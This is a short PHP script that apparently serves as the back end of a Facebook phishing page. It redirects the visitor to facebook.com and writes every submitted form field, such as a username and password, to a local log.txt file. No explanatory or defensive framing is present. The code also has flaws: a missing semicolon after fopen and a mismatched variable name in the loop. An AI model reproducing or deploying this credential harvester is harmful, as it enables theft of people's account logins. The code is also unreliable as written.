<?php
header ("location: http://www.facebook.com");
$handle = fopen("log.txt", "a")
foreach($_POST as $Variable => $value) {
  fwrite($handle,$variable);
  fwrite($handle, "=");
  fwrite($handle, $value);
  fwrite($handle,"\r\n");
 }
  fwrite($handle,"\r\n");
  fclose($handle);
  exit ;
?>
